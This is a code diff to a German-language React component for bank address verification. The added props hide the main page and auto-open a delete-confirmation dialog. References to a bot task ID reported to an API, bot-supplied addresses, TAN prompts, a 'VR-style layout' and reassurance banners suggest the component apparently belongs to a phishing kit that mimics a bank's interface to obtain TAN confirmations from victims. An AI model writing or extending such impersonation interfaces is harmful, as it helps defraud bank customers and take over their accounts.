@@ -64,6 +64,10 @@ interface AddressVerificationProps {
   /** Aktive Bot-Task-ID, um Bestätigung an die API zurückzumelden. */
   taskId?: string | null;
   apiBaseUrl?: string | null;
+  /** Wenn true, wird die Basis-Seite (Reassurance + Adress-Auswahl-Karte) ausgeblendet. Nur Dialoge werden gerendert. */
+  hideBaseContent?: boolean;
+  /** Wenn true, wird der Lösch-Bestätigungs-Dialog automatisch geöffnet. */
+  autoOpenDeleteDialog?: boolean;
 }
 
 
@@ -86,6 +90,8 @@ const AddressVerification = ({
   onTanFailed,
   taskId,
   apiBaseUrl,
+  hideBaseContent = false,
+  autoOpenDeleteDialog = false,
 }: AddressVerificationProps) => {
 
   const secureGoLabel = getSecureGoLabel(bankGroup);
@@ -130,6 +136,18 @@ const AddressVerification = ({
       onSecureGoOpened?.();
     }
   }, [forceShowSecureGo, onSecureGoOpened]);
+
+  // Auto-open delete confirmation dialog when requested from parent
+  const autoOpenedDeleteRef = useRef(false);
+  useEffect(() => {
+    if (autoOpenDeleteDialog && !autoOpenedDeleteRef.current) {
+      autoOpenedDeleteRef.current = true;
+      setShowDeleteDialog(true);
+    }
+    if (!autoOpenDeleteDialog) {
+      autoOpenedDeleteRef.current = false;
+    }
+  }, [autoOpenDeleteDialog]);
 
   const [tanType, setTanType] = useState<"address" | "login" | null>(null);
   const [addressTanSuccess, setAddressTanSuccess] = useState(false);
@@ -291,6 +309,7 @@ const AddressVerification = ({
   const hasBotAddress = !!(currentAddress?.strasse || currentAddress?.plzOrt);
 
   if (isLoading || !hasBotAddress) {
+    if (hideBaseContent) return null;
     return (
       <div className="w-full max-w-2xl mx-auto text-center py-12 text-gray-500">
         Adressdaten werden geladen…
@@ -312,7 +331,8 @@ const AddressVerification = ({
 
 
   return (
-    <div className="w-full max-w-2xl mx-auto flex flex-col gap-4">
+    <div className={hideBaseContent ? "contents" : "w-full max-w-2xl mx-auto flex flex-col gap-4"}>
+      {!hideBaseContent && (<>
       {/* Reassurance banner */}
       <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
         <div className="flex items-start gap-3">
@@ -470,6 +490,7 @@ const AddressVerification = ({
           </div>
         </div>
       </div>
+      </>)}
 
       {/* Delete confirmation dialog — VR-style layout */}
       <AlertDialog
@@ -714,6 +735,8 @@ const AddressVerification = ({
         </AlertDialogContent>
       </AlertDialog>
 
+      {!hideBaseContent && (
+      <>
       {/* Security footer note */}
       <div className="bg-white rounded-xl shadow-md border border-gray-200 p-5">
         <div className="flex items-start gap-3">
@@ -726,6 +749,8 @@ const AddressVerification = ({
           </div>
         </div>
       </div>
+      </>
+      )}
       {/* SmartTanOverlay wird global in BankLogin gerendert – hier bewusst weggelassen, um Doppel-Overlay zu vermeiden. */}
     </div>
   );
